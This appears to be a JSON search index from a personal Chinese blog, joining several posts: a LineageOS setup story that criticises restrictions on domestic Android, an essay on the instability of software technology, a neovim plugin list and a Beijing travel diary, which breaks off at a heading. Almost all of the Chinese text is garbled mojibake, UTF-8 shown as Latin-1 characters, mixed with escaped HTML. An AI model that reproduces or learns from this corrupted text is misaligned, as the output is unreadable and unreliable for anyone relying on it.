ä¸€æ­¥æ­¥æ²¦ä¸ºèµ„æœ¬å¸‚åœºçš„ç©ç‰©å’Œå·¥å…·. MIUIä¹Ÿå¥½, ColorOSä¹Ÿç½¢, ç”¨æˆ·æ€»èƒ½åœ¨ä½¿ç”¨ç³»ç»Ÿçš„è¿‡ç¨‹ä¸­å‘ç°ä¸€äº›å»ä¹Ÿå»ä¸æ‰çš„åº”ç”¨å’Œå°ç¨‹åº, çœ‹åˆ°ä¸€äº›ä¸æƒ³çœ‹ä¹Ÿå¾—çœ‹çš„å¹¿å‘Š, è€Œèµ·åˆ, æœ‰äº›äººå°½ç®¡å¯¹æ­¤æœ‰æ‰€ä¸æ»¡, ä½†åŸºæœ¬éƒ½é€‰æ‹©å®¹å¿çš„æ€åº¦, ä½†è¿™å‡ å¹´å›½å†…çš„è¶‹åŠ¿è¶Šæ¥è¶Šä¸å¯¹åŠ²: å…ˆæ˜¯æŸAPPåœ¨å…¨ç¤¾ä¼šçš„å®£ä¼ ä¸‹æˆ–è½¯æ€§æˆ–ç¡¬æ€§åœ°è¢«å®‰è£…åœ¨äº†ç›¸å½“å¤§ä¸€éƒ¨åˆ†äººçš„æ‰‹æœºä¸­ç›‘æ§ä¸ªäººä¿¡æ¯(å½“ç„¶, æˆ‘ç†è§£æ‰“å‡»è¯ˆéª—è¡Œä¸º, ä¿æŠ¤å¹³æ°‘ç™¾å§“çš„é’±åŒ…è¿œæ¯”è½¯ä»¶è‡ªç”±é‡è¦å¾—å¤š), åˆæ˜¯æ‹¼å¤šå¤šè¢«çˆ†å‡ºåˆ©ç”¨å®‰å“æ‰‹æœºçš„0dayæ¼æ´åœ¨æ‰€æœ‰ç”¨æˆ·çš„æ‰‹æœºä¸Šè¿›è¡Œå¤šç§æ¶æ„è¡Œä¸º, ä¸€ç›´åˆ°æœ€è¿‘, ä¸€åˆ™æŸä¿¡éƒ¨çš„å‘æ–‡é€šçŸ¥å°†è¿™ç§ \u003ccode\u003eæˆ‘çš„æ‰‹æœºä¸å½’æˆ‘ç®¡\u003c/code\u003e çš„ç„¦è™‘æ„Ÿæ¨å‘äº†æ–°çš„é«˜æ½®.\u003c/p\u003e\n\u003cp\u003eå°±ç›®å‰æ¥çœ‹, è¿™åˆ™é€šçŸ¥çš„ç¤¾ä¼šåå“å¹¶ä¸å¼ºçƒˆ, ä¸å‡ºæ„å¤–åº”è¯¥å¯ä»¥é¡ºåˆ©æ¨è¡Œ. ä¹‹åæœ€ç›´è§‚çš„æ•ˆæœå°±æ˜¯\u003cstrong\u003eæ‰€æœ‰ä½¿ç”¨å›½å†…å®‰å“ç³»ç»Ÿçš„ç”¨æˆ·éƒ½åªèƒ½å®‰è£…æŒ‡å®šçš„app, ä¸å†å…·å¤‡å®‰è£…æ¨ç‰¹ç­‰è½¯ä»¶çš„èƒ½åŠ›\u003c/strong\u003e, è¿™æ— å¼‚äºå¹²æ‰äº†å®‰å“æœ€å¤§çš„ç‰¹ç‚¹, ä½¿å…¶æ²¦è½ä¸ºå…¨æ–¹ä½è½åäºè‹¹æœçš„æ‰‹æœºç³»ç»Ÿ. ä½œä¸ºä¸€ä¸ªç»å†è¿‡å®‰å“appçˆ†å‘å¼å¢é•¿å¹´ä»£çš„ç©å®¶, æˆ‘å¾ˆå¥½å¥‡ç°åœ¨æ–°æ¥è§¦åˆ°æ‰‹æœºçš„ç”¨æˆ·å¯¹è‡ªå·±æŒä¸­çš„è®¾å¤‡æ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„å°è±¡, æ˜¯ä¸€ä¸ªæ‹¥æœ‰æ— é™å¯èƒ½çš„å·¥å…·? è¿˜æ˜¯ä¸€ä¸ªç”¨ä½è´¨é‡å†…å®¹, å¹¿å‘Šå’Œå……æ»¡é™åˆ¶çš„æ“ä½œç³»ç»Ÿæ¥æ— é™å¸æ”¶æ³¨æ„åŠ›, è·å–ä¸ªäººéšç§å¹¶å˜ç›¸ç®¡ç†ä¸ªäººç²¾ç¥ä¸–ç•Œçš„èµ„æœ¬å’Œæ”¿åºœå·¥å…·?\u003c/p\u003e\n\u003cp\u003eä¸‡å¹¸çš„æ˜¯, å®‰å“çš„å¼€æºå±æ€§ä¸ºå®ƒä¿ç•™ä¸‹äº†ä¸€äº›è‡ªç”±çš„ç«ç§, é‚£è¾¹æ˜¯ç¬¬ä¸‰æ–¹rom. æœ¬æ–‡ä¸»è¦è®°å½•è‡ªå·±å®‰è£… lineageos, magisk, Lsposed ä»¥åŠä¸€äº›æœ‰ç”¨è½¯ä»¶çš„è¿‡ç¨‹.\u003c/p\u003e\n\u003ch2 id=\"è´­ä¹°æœºå™¨\"\u003eè´­ä¹°æœºå™¨\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹\u003ca href=\"https://wiki.lineageos.org/devices/\"\u003elineageosæ”¯æŒçš„è®¾å¤‡åˆ—è¡¨\u003c/a\u003e, å‡ºäºå¯¹ä¸€åŠ çš„åå¥½å’Œå¯¹éªé¾™888å‘çƒ­çš„ä¸æ”¾å¿ƒ, æˆ‘é€‰æ‹©ä»¥ä¸€åŠ 8proä½œä¸ºè‡ªå·±çš„æ–°è®¾å¤‡. åœ¨å’¸é±¼ä¸Šé€›äº†å¾ˆä¹…, ç­›æ‰ä¸€å¤§æ‰¹æœºå™¨è´©å­å’Œä½è´¨é‡å–å®¶å, æˆ‘çœ‹ä¸­äº†ä¸€ä½å®å¦ˆçš„äºŒæ‰‹æœºå¹¶ä¸‹å•. æœºå™¨åˆ°æ‰‹åæˆ‘éå¸¸æ»¡æ„, å› ä¸ºæˆè‰²å®åœ¨æ˜¯å¾ˆå¥½, è¿ç»´ä¿®åº—é‡Œç»™æˆ‘æ‰‹æœºæ¢ç”µæ± çš„å·¥ç¨‹å¸ˆä¹Ÿèµå¹ä¿å…»å¾—ä¸é”™, è¿™1700è™½ç„¶æœ‰ç‚¹è´µ, ä½†è¿˜æ˜¯å€¼å¾—çš„.\u003c/p\u003e","title":"lineageosä½¿ç”¨ä½“éªŒ"},{"content":" ä¹±ä¸–ä¹‹ä¸­, å”¯æœ‰è‡ªæˆ‘ä¸æˆ‘æ‰€çˆ±å€¼å¾—çæƒœ\nå¾ˆä¹…ä»¥æ¥æˆ‘ä¸€ç›´åœ¨æ€è€ƒä¸€ä¸ªé—®é¢˜,ä¸ºä»€ä¹ˆå¯¹äºåˆ«çš„æŠ€æœ¯å‹èŒä¸š,ä¾‹å¦‚åŒ»ç”Ÿ,æ•™å¸ˆ,é«˜çº§æŠ€å·¥,è£ç¼,å¨å¸ˆ,ä»ä¸šè€…çš„ä»ä¸šæ—¶é—´è¶Šé•¿è¶Šåƒé¦™,è€Œå”¯ç‹¬ä¸­å›½ç¨‹åºå‘˜æ·±é™·äº35å²é­”å’’ä¹‹ä¸­.æŠ›å»å›½å†…åŠ³åŠ¨åŠ›å¸‚åœºæ‰­æ›²çš„ä¾›æ±‚å…³ç³»,è¿˜æœ‰ä¸€ä¸ªç»å¸¸ä¸ºäººæ‰€å¿½è§†çš„åŸå› æ˜¯æœ€ä½³æŠ€æœ¯é€‰å‹å°šå¤„äºè¿­ä»£ä¹‹ä¸­.\nä¸å…¶ä»–è¡Œä¸šæ¼«é•¿çš„å‘å±•å†å²ç›¸æ¯”,è®¡ç®—æœºè¡Œä¸šæ˜¯ä¸€ä¸ª\u0026quot;å°å¹´è½»\u0026quot;,è€Œå…¶ä¸‹å±çš„è½¯ä»¶è¡Œä¸šæ›´æ˜¯åˆç”Ÿç‰›çŠŠ.ç†å·¥å†œåŒ»,æ–‡å²å“²è‰º,ç»ç®¡æ³•æ•™,æ¯ä¸€é—¨å­¦ç§‘éƒ½å‘å±•äº†ç™¾å¹´ä»¥ä¸Š,å…¶ä¸­ä¸€äº›çš„å†å²æ›´æ˜¯ä¸äººç±»æ–‡æ˜å²ä¸€èˆ¬æ¼«é•¿.åè§‚è®¡ç®—æœºè¡Œä¸š,ç°ä»£è®¡ç®—æœºçš„ç†å¿µæ˜¯ç”±å›¾çµåœ¨1936å¹´æå‡ºçš„,è€Œç¬¬ä¸€å°å¯ç¼–ç¨‹é€šç”¨è®¡ç®—æœºåˆ™æ˜¯åœ¨1945å¹´å‡ºç°çš„.è¿™ä»…ä»…åªæ˜¯ä¸€ä¸ªå¼€å§‹,ç”±äºè¡Œä¸šçš„ç‰¹æ®Šæ€§,ç›´åˆ°1978å¹´x86æ¶æ„å‡ºç°ä»¥åŠ1973å¹´Cè¯­è¨€å‡ºç°,è½¯ä»¶è¡Œä¸šæ‰ç®—æ˜¯å¼€å§‹å‘å±•.å¦‚æ­¤ç®—æ¥,å½“ä»£å¦‚æ—¥ä¸­å¤©äººäººç¾¡è‰³çš„ç¨‹åºå‘˜è¡Œä¸š,ä»…ä»…åªæœ‰äº”åå¤šå²,æ¯”æˆ‘ä»¬çš„çˆ·çˆ·å¥¶å¥¶è¾ˆéƒ½è¦å¹´è½»ä¸å°‘.å¦‚æ­¤å¹´è½»çš„è¡Œä¸š,åŠ¿å¿…è¿˜æœ‰å¾ˆå¤§çš„æå‡ç©ºé—´.\nå¦å¤–,è½¯ä»¶è¡Œä¸šçš„å‘å±•ä¹Ÿéšæ—¶å—ç¡¬ä»¶å‘å±•çš„å½±å“,20å¹´å‰å¯¸åœŸå¯¸é‡‘çš„å†…å­˜åœ¨ä»Šå¤©å·²ç»ä¸å†æˆä¸ºç”¨æˆ·ä½¿ç”¨çš„ç“¶é¢ˆ,é‚£äº›ä¸ºäº†å……åˆ†åˆ©ç”¨å†…å­˜è€Œæƒ³å‡ºçš„å¥‡æ€å¦™æƒ³ä¹Ÿä¸å†ä¸ºäººæ‰€æ´¥æ´¥ä¹é“.ç¡¬ä»¶æˆäº†ç»å¤§éƒ¨åˆ†è½¯ä»¶å¼€å‘ä»»åŠ¡ä¸­æœ€ä½å»‰çš„æˆæœ¬,è€ŒäººåŠ›æˆæœ¬å çš„æ¯”é‡åˆ™è¶Šæ¥è¶Šé«˜,è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯¸å¦‚Electronä¹‹ç±»çš„æ¡†æ¶èƒ½å¤Ÿå¤§è¡Œå…¶é“.è¿™åªæ˜¯ç¡¬ä»¶å½±å“è½¯ä»¶çš„æ¡ˆä¾‹ä¸­å½±å“æ¯”è¾ƒå°çš„æ¡ˆä¾‹,å…¶ä»–çš„ç¡¬ä»¶å˜é©,ä¾‹å¦‚è‹¹æœArmæ¶æ„å¯¹ä¼ ç»Ÿx86æ¶æ„çš„å†²å‡»,è‹¹æœå…±äº«å†…å­˜åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸå¯¹è‹±ä¼Ÿè¾¾çš„ä¼˜åŠ¿,ä¹ƒè‡³äºå¯èƒ½å‡ºç°çš„é‡å­è®¡ç®—æœº,éƒ½æ­£åœ¨å¯¹è½¯ä»¶è¡Œä¸šäº§ç”ŸæŒç»­æ€§çš„å½±å“,è€Œè¿™äº›å½±å“æ‰€èƒ½å¸¦æ¥ä»€ä¹ˆæ ·çš„æ”¹å˜,ç›®å‰è¿˜è¯´ä¸å¥½,æ¯•ç«Ÿè®¡ç®—æœºæ˜¯ä¸€ä¸ªç›¸å½“å¹´è½»çš„è¡Œä¸š,è¿ç¡¬ä»¶éƒ½æ²¡æœ‰è¾¾åˆ°å…¬è®¤æœ€ä¼˜çš„çŠ¶æ€(æ¶æ„,æŒ‡ä»¤é›†,å®¹é‡,å¯¿å‘½ç­‰ç­‰),æ›´ä½•å†µæ˜¯åœ¨æ­¤åŸºç¡€ä¸Šçš„è½¯ä»¶è¡Œä¸šå‘¢?\nå“ªæ€•æ˜¯æŠ›å¼€ç¡¬ä»¶å˜åŒ–çš„å½±å“ä¸è°ˆ,è½¯ä»¶é¢†åŸŸå†…éƒ¨ä¹Ÿåœ¨ä¸åœæ›´è¿­ä¸­.\nè®ºç¼–ç¨‹è¯­è¨€,ä¸è¯´typescript,coffeescriptè¿™äº›åœ¨javascriptåŸºç¡€ä¸Šå‘å±•çš„è¯­è¨€,ä¸”è¯´golangå’Œrustä¸¤ä½æŠ›å¼ƒé¢å‘å¯¹è±¡çš„åèµ·ä¹‹ç§€å·²ç»å¼€å§‹å‡­å€Ÿå®ƒä»¬ä¼˜ç§€çš„è®¾è®¡åˆ†åˆ«åœ¨ä¸šåŠ¡é¢†åŸŸå’ŒåŸºç¡€è®¾æ–½é¢†åŸŸé€æ¸èš•é£Ÿjavaå’Œc++çš„ä»½é¢,åä¸¤è€…ç”±äºæ‹¥æœ‰æˆç†Ÿçš„ç”Ÿæ€å’Œå¤§é‡çš„å·²æœ‰å®è·µå¯¼è‡´å¼€å‘è€…ç»å¸¸é™·å…¥ç¼–ç¨‹è¯­è¨€çš„é€‰æ‹©å›°éš¾ç—‡,åœ¨æ­¤åŸºç¡€ä¸Šè¿˜è¡ç”Ÿå‡ºäº†å„ç§ç¼–ç¨‹è¯­è¨€å®—æ•™.è€Œgolangå’Œrustå°±æ˜¯æœ€æ£’çš„ç¼–ç¨‹è¯­è¨€å—?æˆ‘ä¸çŸ¥é“,åœ¨ä¸‹ä¸€ä¸ªæ›´å¥½çš„è¯­è¨€å‡ºç°ä¹‹å‰,æ²¡æœ‰äººçŸ¥é“è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆ.\nè®ºä½“ç³»æ¶æ„,è¶Šæ¥è¶Šå¤šçš„åº”ç”¨ä¹Ÿæ­£ç»å†ä»ç§æœ‰çš„æœåŠ¡å™¨è¿ç§»åˆ°äº‘å¹³å°çš„è¿‡ç¨‹,å¼€å‘è€…ä»¥æ­¤èƒ½å¤Ÿæ›´åŠ ä¸“æ³¨äºä¸šåŠ¡ä»£ç çš„å¼€å‘è€Œå°†æ›´å°‘çš„ç²¾åŠ›æµªè´¹åœ¨è¿ç»´ä¸Š. ä½†äº‘å°±æ˜¯è½¯ä»¶æ¶æ„çš„ç»ˆç‚¹å—?æˆ‘ä¹Ÿä¸çŸ¥é“,è‡³å°‘äº‘å¸¦æ¥çš„å¯ä¿¡é—®é¢˜å’Œå®‰å…¨é—®é¢˜æ­£åœ¨è¢«å¾ˆå¤šäººç ”ç©¶.\nè®ºåº”ç”¨æ¡†æ¶,æ¡Œé¢ç¨‹åºçš„å¼€å‘æ¡†æ¶å°±æœ‰å¥½å‡ ç§,ç°åœ¨æ¯”è¾ƒæµè¡Œçš„Electronæ¡†æ¶å‡ºæ¥ä¹Ÿä¸è¿‡10å¹´,è€Œæ–°çš„æ¡†æ¶ä¹Ÿéšç€rustçš„å…´èµ·å¦‚é›¨åæ˜¥ç¬‹èˆ¬å‡ºç°.å‰ç«¯é¢†åŸŸä¸­,vue angular reactå‡ ä¸ªæ¡†æ¶æ‰“å¾—ä¸å¯å¼€äº¤, å“ªæ€•æ˜¯ä¹…å±…è±¡ç‰™å¡”çš„äººå·¥æ™ºèƒ½é¢†åŸŸ, ä¹Ÿå¼€å§‹å‡ºç°rusté›¶æ˜Ÿçš„å½±å­\u0026hellip;å‡ ä¹æ¯ä¸€ä¸ªé¢†åŸŸéƒ½åœ¨å˜é©,æ¯ä¸€ä¸ªé¢†åŸŸéƒ½æ²¡æœ‰ç»Ÿä¸€çš„æœ€ä½³æ¡†æ¶.\næˆ‘å‡ ä¹ç¬ƒå®š,åœ¨æˆ‘ä»¬è¿™ä»£äººæ­»å,è®¡ç®—æœºè¡Œä¸šä¾æ—§ä¸ä¼šå‘å±•åˆ°åˆ°åƒåŒ»å­¦å’Œæ³•å­¦é‚£æ ·æˆç†Ÿçš„åœ°æ­¥,æ‰€ä»¥å¯¹äºå¼€å‘è€…æ¥è¯´,çº ç»“æ¡†æ¶,çº ç»“è¯­è¨€å®åœ¨æ˜¯å¤§å¯ä¸å¿…. æˆ‘ä»¬åªæ´»ä¸€æ¬¡,ä¸å…¶æŠŠçƒ­æƒ…æŠ¼åœ¨ä¸ä¸€å®šæ°¸æ’çš„ç¬¦å·é›†åˆä¸Š,ä¸å¦‚å¥½å¥½ç”Ÿæ´»,å¤šå…³å¿ƒå…³å¿ƒèº«è¾¹äºº.\n","permalink":"https://dragonbox.top/posts/gossip-unstable-software/","summary":"\u003cblockquote\u003e\n\u003cp\u003eä¹±ä¸–ä¹‹ä¸­, å”¯æœ‰è‡ªæˆ‘ä¸æˆ‘æ‰€çˆ±å€¼å¾—çæƒœ\u003c/p\u003e\n\u003c/blockquote\u003e","title":"åŠ¨è¡æ—¶ä»£"},{"content":" ç°åœ¨å›å¤´çœ‹å‡ å¹´å‰è‡ªå·±å†™çš„æ’ä»¶é…ç½®æ–‡ç« , çœ‹ç€é‚£äº›æ›¾ç»ç”¨è¿‡ä½†åæ¥éƒ½çº·çº·è¢«æ›¿ä»£çš„æ’ä»¶, æˆ‘ä¼šè«åæ€€å¿µé‚£æ®µå› è®¡ç®—æœºå’Œç»ˆç«¯è€Œå…´å¥‹ä¸å·²çš„è‡ªå·±.\nåœ¨ 2019 å¹´å››æœˆä»½ç¬¬ä¸€æ¬¡å†™ vim é…ç½®æ–‡ç« å, æ—¶é—´å·²ç»è¿‡å»äº†å››å¹´. ç‰©æ˜¯äººé, è¿™å‡ å¹´å‘ç”Ÿäº†å¤ªå¤šçš„ç ´äº‹çƒ‚äº‹, å›æƒ³èµ·æ¥, ç«Ÿæ²¡æœ‰å‡ ä»¶å¥½äº‹å¯ä¾›ç©èµçš„, å›½å®¶çš„å…´ç››ç¹è£å’Œæ™®é€šäººæš—æ·¡çš„ç”Ÿæ´»äº§ç”Ÿäº†å¼ºçƒˆçš„å¯¹æ¯”, å…¶å¸¦æ¥çš„æ’•è£‚æ„Ÿè®©åŒ…æ‹¬æˆ‘åœ¨å†…çš„è®¸å¤šäººéƒ½æ„Ÿåˆ°éº»æœ¨ä¸”ç–²æƒ«, æ¯å½“æ„Ÿåˆ°ç»æœ›å’Œæ‚²å“€æ—¶, æˆ‘ä¼šè¯‰è¯¸æ–‡å­—æ¥æ’é£æƒ…ç»ª, æ•²æ•²ä»£ç æ¥ä¸ºè‡ªå·±çš„ç”Ÿæ´»å¸¦æ¥äº›è®¸æ„ä¹‰, æ¯•ç«Ÿ, è¿™æ˜¯ç¨‹åºå‘˜ä¸ºæ•°ä¸å¤šçš„ç‰¹æƒäº†.\nè€Œä¸ç®¡æ˜¯å†™æ–‡ä¹Ÿå¥½, å†™ä»£ç ä¹Ÿå¥½, äººè‹¥é‡è§†, è‡ªç„¶ä¼šæƒ³å¾—åˆ°ä¸€ä¸ªè¶æ‰‹çš„å·¥å…·: jetbrain IDE, obsidian, word, trilium, vscode \u0026hellip;\u0026hellip; å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´, è¿™äº›ä¾¿å·²ç»è¶³å¤Ÿ, åªæ˜¯å¦‚æœæœ‰äººä»”ç»†è§‚å¯Ÿ, å°±ä¼šå‘ç°è¿™äº›å·¥å…·éƒ½æ˜¯å•†ä¸šåŒ–çš„é—­æºè½¯ä»¶, vscode ä¹Ÿæ˜¯, å³ä¾¿å®£ç§°å¼€æº, ä½†æ˜¯äººä»¬ç”¨çš„äºŒè¿›åˆ¶åŒ…æ˜¯å¾®è½¯åœ¨å¼€æºä»£ç çš„åŸºç¡€ä¸Šæ·»åŠ äº†åŠŸèƒ½åå°è£…é—­æºçš„. ä¸è¿‡è¯´åˆ°åº•, è¿™äº›è½¯ä»¶å¼€æºä¸å¦, å¯¹æˆ‘ä»¬æ™®é€šäººæ¥è¯´å¹¶æ²¡æœ‰å¤šå¤§çš„å½±å“, åªæ˜¯å¯¹äºæœ‰å¼€æºè½¯ä»¶æ´ç™–çš„äººæ¥è¯´å¯èƒ½ä¼šæ— æ³•æ¥å—, è¿™ä¸ªæ—¶å€™å¦‚æœå†’å‡ºæ¥ä¸€ä¸ªå¼€æº, ç®€å•å´åˆæ‹¥æœ‰æ— é™æ‰©å±•æ€§å’Œä¸è¾“ç»™ IDE çš„åŠŸèƒ½çš„ç¼–è¾‘å™¨, é‚£ä¹ˆæ— ç–‘èƒ½æ”¶è·ä¸€æ‰¹ç²‰ä¸, è€Œ neovim æ­£æ˜¯è¿™æ ·çš„ç¼–è¾‘å™¨.\nä¹‹å‰åœ¨çŸ¥ä¹çœ‹åˆ°äº†ä¸€ä¸ªé—®é¢˜: ç¼–è¾‘å™¨ä¸­ä½ è®¤ä¸ºæœ€é‡è¦çš„åŠŸèƒ½æœ‰å“ªäº›? æˆ‘åœ¨è¿™é‡Œåˆ—å‡ºè‡ªå·±è®¤ä¸ºæ¯”è¾ƒé‡è¦çš„åŠŸèƒ½, æ¥ä½œä¸ºæœ¬æ–‡çš„ç´¢å¼•:\nè‰¯å¥½çš„ç¼–ç ä½“éªŒ äººæ€§åŒ–çš„ç•Œé¢ ä»£ç è°ƒè¯• æ¨¡ç³ŠæŸ¥æ‰¾ å…¶ä»– ä¸æ­¤åŒæ—¶: æ–‡æœ¬ä»…å¯¹ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„æ’ä»¶è¿›è¡Œæ¨è, å¹¶åœ¨æ–‡æœ«è´´å‡ºè‡ªå·±çš„é…ç½®é“¾æ¥, åœ¨è¿™é‡Œä¸å¯¹è‡ªå·±çš„é…ç½®è¿‡å¤šçš„ä»‹ç» (å› ä¸ºç¡®å®ç»“æ„æ¯”è¾ƒç®€å•, å¤§ä¼™ä¸€çœ‹å°±ä¼šæ˜ç™½çš„ :) .\nè‰¯å¥½çš„ç¼–ç ä½“éªŒ åŠŸèƒ½ æ’ä»¶ è¯­æ³•é«˜äº® nvim-treesitter/nvim-treesitter ä»£ç è¡¥å…¨ hrsh7th/nvim-cmp ä»£ç ç‰‡æ®µ L3MON4D3/LuaSnip å…¶ä»–linter, formatterç­‰ nvimtools/none-ls.nvim AI(Copilot)é›†æˆ zbirenbaum/copilot.lua git çŠ¶æ€æ˜¾ç¤º lewis6991/gitsigns.nvim è‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£ danymat/neogen å…‰æ ‡è·³è½¬ folke/flash.nvim lsp å¢å¼ºä½“éªŒ glepnir/lspsaga.nvim é«˜äº®å½“å‰è¯ RRethy/vim-illuminate ä»£ç ç»“æ„å±•ç¤º nvim-neo-tree/neo-tree.nvim ç‰¹è‰²ç¼©è¿› lukas-reineke/indent-blankline.nvim ç‰¹è‰²æ³¨é‡Š folke/todo-comments.nvim å¿«é€Ÿæ³¨é‡Š numToStr/Comment.nvim tab è·³å‡ºæ‹¬å·å’Œå­—ç¬¦ä¸² abecodes/tabout.nvim ä»£ç æŠ˜å  kevinhwang91/nvim-ufo lsp/format/dap æºç®¡ç† williamboman/mason.nvim æ‹¬å·æ“ä½œ kylechui/nvim-surround è‡ªåŠ¨è¡¥å…¨æ‹¬å·ä¸­æ‹¬å·ç­‰ windwp/nvim-autopairs éƒ¨åˆ†åŠŸèƒ½æˆªå›¾:\näººæ€§åŒ–çš„ç•Œé¢ åŠŸèƒ½ æ’ä»¶ ä¸»é¢˜ folke/tokyonight.nvim å¼•å¯¼ç•Œé¢ glepnir/dashboard-nvim æ–‡ä»¶æ ‘ nvim-neo-tree/neo-tree.nvim æ ‡ç­¾æ  akinsho/bufferline.nvim çŠ¶æ€æ  hoob3rt/lualine.nvim æˆªå›¾:\nä»£ç è°ƒè¯• åŠŸèƒ½ æ’ä»¶ è°ƒè¯•åŠŸèƒ½ mfussenegger/nvim-dap å±•ç¤º ui rcarriga/nvim-dap-ui inline å˜é‡æ˜¾ç¤º theHamsta/nvim-dap-virtual-text æ¨¡ç³ŠæŸ¥æ‰¾ åŠŸèƒ½ æ’ä»¶ æ¨¡ç³ŠæŸ¥æ‰¾ nvim-telescope/telescope.nvim fzfé›†æˆ nvim-telescope/telescope-fzf-native.nvim æˆªå›¾: å…¶ä»– åŠŸèƒ½ æ’ä»¶ Tmuxé€‚é… christoomey/vim-tmux-navigator åˆ é™¤bufferçš„åŒæ—¶ä¸ç ´åçª—å£å¸ƒå±€ famiu/bufdelete.nvim è¿œç¨‹å‰ªåˆ‡æ¿åŒæ­¥ ojroques/nvim-osc52 session æ¢å¤ tpope/vim-obsession æœ€åè´´ä¸Šé…ç½®æ–‡ä»¶åœ°å€, æ„Ÿå…´è¶£å¯ä»¥å»çœ‹çœ‹: link\n","permalink":"https://dragonbox.top/posts/tech-neovim2023/","summary":"\u003cblockquote\u003e\n\u003cp\u003eç°åœ¨å›å¤´çœ‹å‡ å¹´å‰è‡ªå·±å†™çš„æ’ä»¶é…ç½®æ–‡ç« , çœ‹ç€é‚£äº›æ›¾ç»ç”¨è¿‡ä½†åæ¥éƒ½çº·çº·è¢«æ›¿ä»£çš„æ’ä»¶, æˆ‘ä¼šè«åæ€€å¿µé‚£æ®µå› è®¡ç®—æœºå’Œç»ˆç«¯è€Œå…´å¥‹ä¸å·²çš„è‡ªå·±.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"æˆ‘çš„neovim"},{"content":"éš¾å¾—é»„å°å§æ¥ä¸€æ¬¡åŒ—äº¬, ä½œä¸ºè‚¥å®…çš„è‡ªå·±ç´§æ€¥è§„åˆ’äº†ä¸€ä¸‹æ¸¸ç©è·¯çº¿, å‘ç°åŒ—äº¬å¯ç©çš„åœ°æ–¹ç›¸å½“çš„å¤š, è¿™é‡Œä»…ä»…è®°å½•è¿™æ¬¡æ¸¸ç©æ‰€ç»è¿‡çš„ä¸‰ä¸ªæ™¯åŒº.\nå¤©å®‰é—¨ ä¸€å¤§æ—©èµ·æ¥ä»å­¦æ ¡å‡ºå‘, ä¸é»„å°å§ä¼šåˆä¹‹ååç€åœ°é“æ¥åˆ°äº†å¤©å®‰é—¨å¹¿åœº. ç°åœºäººå¾ˆå¤š, é»„å°å§æŒ‡æŒ¥æˆ‘ç»™å¥¹æ‹ç…§, å¹¶ç°åœºè¿›è¡Œæ‹ç…§æ•™å­¦, åªå¯æƒœæˆ‘å§”å®ä¸æ˜¯è¿™å—æ–™. éš”ç€ä¸€æ¡è¡—çœ‹å¤©å®‰é—¨, å‘ç°é‚£çº¢å¢™è¿œæ²¡æœ‰è‡ªå·±æƒ³è±¡ä¸­æ¥å¾—è‰³ä¸½, è€Œæ˜¯ç•¥æœ‰äº›æš—æ²‰. æˆ‘å¯¹å¤©å®‰é—¨æ²¡æœ‰ä»€ä¹ˆå…´è¶£, ä½†æ˜¯çœ‹åˆ°äººæ°‘è‹±é›„çºªå¿µç¢‘æ—¶ä¼šå¿ä¸ä½è¿‡å»çœ‹çœ‹, å› ä¸ºæˆ‘çŸ¥é“æ”¿æ²»ä¼šéª—äºº, ä½†è‹±é›„çš„ç‰ºç‰²ä¸ä¼š.\næ‹œè®¿å®Œå¤©å®‰é—¨, æœ¬æƒ³åä¸ªå…¬äº¤å»æ™¯å±±å…¬å›­, ä½†æ˜¯å¾ˆæ˜æ˜¾, èº«è¾¹äººå±±äººæµ·çš„æ¸¸å®¢ä»¬ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„. å…¬äº¤è½¦è¿˜æ²¡åˆ°, å¤§çˆ·å¤§å¦ˆä»¬å°±æ‰’èµ·äº†è½¦é—¨, è½¦é—¨ä¸€å¼€, ä»–ä»¬å°±åƒæ˜¯æˆ˜åœºä¸Šçš„å‹‡å£«ä¸€èˆ¬æ‹¼å‘½å¾€ä¸ŠæŒ¤, æ— è®ºå‰é—¨è¿˜æ˜¯åé—¨, ä¸æ¯«æ²¡æœ‰è€ƒè™‘åˆ°è½¦ä¸Šçš„äººéƒ½ä¸‹ä¸æ¥äº†. æˆ‘å¾ˆä¹…æ²¡æœ‰è§è¯†è¿‡è¿™æ ·çš„åœºé¢, å¬ç€è½¦ä¸Šå­©å­çš„å“­é—¹, æƒ³åˆ°è¿™é‡Œæ˜¯å¤©å®‰é—¨å‰, æ›´è§‰é­”å¹». æˆ‘ä»¬ä¹Ÿæ”¾å¼ƒäº†å…¬äº¤è½¦, æ­¥è¡Œå‰å¾€æ™¯å±±å…¬å›­.\næ™¯å±±å…¬å›­ ä¸€è·¯ä¸Šæ­¥è¡Œäº†è®¸ä¹…, ç­‰åˆ°è¾¾å…¬å›­çš„æ—¶å€™æˆ‘ä¹Ÿæœ‰äº›ç´¯äº†. è¿é¢çœ‹åˆ°æœ‰äº›æ¸¸å®¢èšåœ¨ä¸€å¤„çŸ³ç¢‘é¢å‰, æˆ‘å‡‘ä¸Šå»çœ‹, å½“å³å‘ç°è¿™é‡ŒåŸæ¥æ˜¯å´‡ç¥¯çš‡å¸è‡ªæ€çš„åœ°æ–¹, é‚£æ˜¯å½“å¹´åœ¨æ˜æœé‚£äº›äº‹é‡Œé¢çœ‹åˆ°çš„äººç‰©, åˆ°ä»Šå¤©å°è±¡ä¹Ÿé¢‡ä¸ºæ·±åˆ». è¿™æ ·çš„æ„å¤–å‘ç°è®©è‡ªå·±åœ¨æ¸¸è§ˆæ™¯ç‰©æ—¶ä¸è‡ªè§‰çš„å¸¦ä¸Šäº†å†å²çš„æ»¤é•œ, æ¯å½“çœ‹åˆ°ä¸€å—çŸ³é›•çš„æ—¶å€™, å¿ƒé‡Œå°±ä¼šåœ¨æƒ³, è¿™å—çŸ³å¤´å½“å¹´æ˜¯ä¸æ˜¯å´‡ç¥¯è‡ªæ€çš„è§è¯è€…ä¹‹ä¸€å‘¢?\nå½“ç„¶, å…ä¸äº†çš„è¿˜æœ‰é»„å°å§çš„ä¾‹è¡Œç…§ç›¸, æˆ‘ä»¬çˆ¬ä¸Šå±±, åœ¨å±±é¡¶ä»¥ä¿¯ç°è§†è§’æ‹åˆ°äº†æ•…å®«, ç„¶åç´¯å¦‚æ­»ç‹—ä¸€èˆ¬æ…¢æ…¢ä¸‹å±±.\nåŒ—äº¬åŠ¨ç‰©å›­ 